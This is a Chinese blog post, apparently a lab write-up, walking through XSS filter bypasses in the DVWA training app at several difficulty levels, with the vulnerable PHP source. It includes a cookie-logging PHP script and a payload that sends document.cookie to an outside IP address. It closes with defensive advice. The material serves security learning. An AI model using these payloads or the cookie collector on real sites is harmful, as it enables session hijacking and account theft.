+<p><strong>medium级别：</strong><br>网页的源码没区别，看看后台源码</p>
+<pre><code class="php">&lt;?php
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {
+    $default = $_GET[&#39;default&#39;];
+    # Do not allow script tags
+    if (stripos ($default, &quot;&lt;script&quot;) !== false) {
+        header (&quot;location: ?default=English&quot;);
+        exit;
+    }
+}
+?&gt;</code></pre>
+<p>这里关键的地方就在<code>stripos($default, &quot;&lt;script&quot;)</code>这个函数，当我们提交的内容含有<code>&lt;script</code>这个字符串时，就会执行下面那条语句，直接将url替换成<code>?default=English</code>，并且stripos对大小写不敏感<br>这样我们，就不能用大写字母或双写绕过，那么我们可以构造一下url<br><font color=red>xxx/?default=&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</font><br>成功弹窗，<code>&lt;/select&gt;</code>是用来闭合select标签的</p>
+<p><strong>high级别：</strong><br>这里肯定也是后台进行了一些处理</p>
+<pre><code class="php">&lt;?php
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {
+    # White list the allowable languages
+    switch ($_GET[&#39;default&#39;]) {
+        case &quot;French&quot;:
+        case &quot;English&quot;:
+        case &quot;German&quot;:
+        case &quot;Spanish&quot;:
+            # ok
+            break;
+        default:
+            header (&quot;location: ?default=English&quot;);
+            exit;
+    }
+}
+?&gt;</code></pre>
+<p>这里对我们的输入进行了判断，如果请求的值不是选项里的内容，就会自动选择English<br>经过分析发现，这里仅对内容进行简单的判断，我们可以利用php里的注释符来绕过，构造如下url<br><font color=red>xxx/?default=French#&lt;script&gt;alert(1)&lt;/script&gt;</font><br>可以弹窗，这里后台将值代入匹配判断时，#后的字符串被当成注释了，所以能通过检测</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><strong>low级别：</strong><br>直接先上传一个正常的留言来，看看返回的页面源码<br><img src="6.png" alt="6"><br>可以看到是这样显示的，直接利用之前反射型构造的语句来实验<font color=red>&lt;script&gt;alert(1)&lt;/script&gt;</font>，将这句语句分别放入标题框和信息框中，在标题框中发现只能放入10个字符，应该是前端js过滤，查看元素修改一下数值即可，输入更长的字符串<br><img src="7.png" alt="7"><br>提交后弹窗两次，说明这两个地方存在这个漏洞，重新刷新页面，仍然会弹窗，说明这是个存储型的XSS<br>看看后台源码</p>
+<pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Sanitize name input
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    //mysql_close();
+}
+?&gt;</code></pre>
+<p>这里再将数据存储到数据库是使用了硬编码来防止sql注入，但是在数据输出时没有做处理，<code>script</code>语句仍能正常执行</p>
+<p><strong>medium级别：</strong><br>使用之前的语句进行检测<br>果然输出的内容只剩alert(1)了，<code>&lt;script&gt;</code>被过滤，标题框仍然可以修改大小<br>套路和之前的一样，一个个试吧<br><font color=red>&lt;img src=1 onerror=alert(‘xss’)&gt;</font><br><img src="8.png" alt="8"><br>发现在标题处使用这条语句能成功，但是在信息里是不成功的，应该是进行了一些处理的<br>看看源码吧</p>
+<pre><code class="php">&lt;?php
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+    // Sanitize name input
+    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    //mysql_close();
+}
+?&gt;</code></pre>
+<p>可以看到message的内容被处理了<code>$message = htmlspecialchars( $message );</code>，而name处仅仅是对<code>&lt;script&gt;</code>进行了替换，所以可以通过大小写或嵌套绕过，或者使用<code>&lt;img&gt;</code>，所以这里name框存在这个漏洞。</p>
+<p><strong>high级别：</strong><br>这里只是对<code>&lt;script&gt;</code>更严格的过滤，和之前的反射型过滤方法是一样的，这里再name框中使用<code>&lt;img&gt;</code>即可绕过，后台源码与medium级别是类似的。</p>
+<h2 id="通过XSS获取COOKIE"><a href="#通过XSS获取COOKIE" class="headerlink" title="通过XSS获取COOKIE"></a>通过XSS获取COOKIE</h2><p>后台接收cookie的脚本</p>
+<pre><code class="php">&lt;?php
+$cookie = $_GET[&#39;cookie&#39;];//以GET方式获取cookie变量值
+$time = date(&#39;Y-m-d g:i:s&#39;);//以年-月-日时：分：秒的格式显示时间
+$referer = getenv(&#39;HTTP_REFERER&#39;);//获取referer
+$cookietxt = fopen(&#39;cookie.txt&#39;,&#39;a&#39;);//打开cookie.txt，若不存在则创建它
+fwrite($cookietxt,&#39;time:&#39;.$time.&#39; &#39;.&#39;cookie:&#39;.$cookie.&#39; &#39;.&#39;referer:&#39;.$referer.&quot;\n&quot;);//写入文件
+fclose($cookietxt);//关闭文件
+?&gt;</code></pre>
+<p>payload:<code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.3.85/xss/index.php?cookie=&#39;+document.cookie+&#39;&quot; width=0 height=0 border=0&gt;&#39;)&lt;/script&gt;</code><br>这里的消息框也有内容长度的限制，不过是前端的改一下就好了<br><img src="9.png" alt="9"><br><img src="10.png" alt="10"><br>已经可以坐等cookie了</p>
+<h2 id="XSS防范措施"><a href="#XSS防范措施" class="headerlink" title="XSS防范措施"></a>XSS防范措施</h2><ul>
+<li>对前端输入做过滤和编码<ul>
+<li>比如输入指定类型的字符，输入检查再服务端完成，对特殊字符进行过滤和转义</li>
+</ul>
+</li>
+<li>对输出做过滤和编码：再变量值输出到前端的HTML时进行编码或转义</li>
+<li>给关键的cookie使用http-only</li>
+</ul>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 zjre@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Dvwa-XSS</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">3.3k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="ZJR">ZJR</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-03-30, 18:02:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-30, 18:13:14</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/03/30/Dvwa-XSS/" title="Dvwa-XSS">http://zjr-g.github.io/2020/03/30/Dvwa-XSS/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 Zlog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#aes加密','#base64','#ctf-web','#BruteForce','#CSPBypass','#CSRF','#CommandInject','#FileInclude','#FileUpload','#InsecureCAPTCHA','#JavaScript','#SQLInject','#XSS','#WeakSessionIDs','#Git','#file_incloude','#MySql_show','#MySql_where','#MySql_like','#MySql_select','#MySql_order by','#MySql_regexp','#MySql_concat','#MySql_function','#MySql_group by','#MySql_having','#MySql_subquery','#MySql_jion','#MySql_union','#MySql_create','#MySql_alter','#MySql_insert','#MySql_update','#MySql_delete','#SSIT','#Markdown','#zip','#hexo',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
